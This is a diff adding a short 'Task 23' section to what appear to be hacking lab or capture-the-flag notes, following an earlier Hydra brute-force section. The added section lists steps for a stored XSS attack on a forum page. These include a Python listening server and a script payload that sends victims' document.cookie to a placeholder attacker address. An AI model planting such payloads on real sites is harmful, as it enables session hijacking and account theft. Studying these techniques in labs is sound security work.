@@ -1070,3 +1070,16 @@ Using Hydra to bruteforce
     ```
 
 # Task 23
+
+Using XSS to steal cookies
+
+* Register on vulnerable web app
+* Find forum page that all users visit
+* Startup local server
+    ```
+    sudo python -m SimpleHTTPServer
+    ```
+* Plant XSS to steal cookie that points back to your listening server
+    ```
+    <script type="text/javascript">document.location="http://a.b.c.d/?c="+document.cookie;</script>
+    ```
